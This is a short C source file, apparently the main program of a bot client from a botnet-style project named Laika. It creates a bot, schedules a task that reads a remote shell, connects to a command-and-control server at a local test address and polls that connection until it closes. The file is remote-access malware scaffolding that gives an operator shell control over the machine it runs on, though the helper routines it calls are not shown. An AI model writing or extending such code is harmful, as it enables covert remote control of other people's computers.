#include <stdio.h>

#include "lerror.h"
#include "ltask.h"
#include "bot.h"
#include "shell.h"

struct sLaika_taskService tService;

void shellTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData) {
    struct sLaika_bot *bot = (struct sLaika_bot*)uData;

    if (bot->shell)
        laikaB_readShell(bot, bot->shell);
}

int main(int argv, char **argc) {
    struct sLaika_bot *bot = laikaB_newBot();

    /* init task service */
    laikaT_initTaskService(&tService);
    laikaT_newTask(&tService, 100, shellTask, (void*)bot);

    /* connect to test CNC */
    laikaB_connectToCNC(bot, "127.0.0.1", "13337");

    /* while connection is still alive, poll bot */
    while (laikaS_isAlive((&bot->peer->sock))) {
        if (!laikaB_poll(bot, laikaT_timeTillTask(&tService))) {
            laikaT_pollTasks(&tService);
        }
    }

    laikaB_freeBot(bot);
    LAIKA_DEBUG("bot killed\n");
    return 0;
}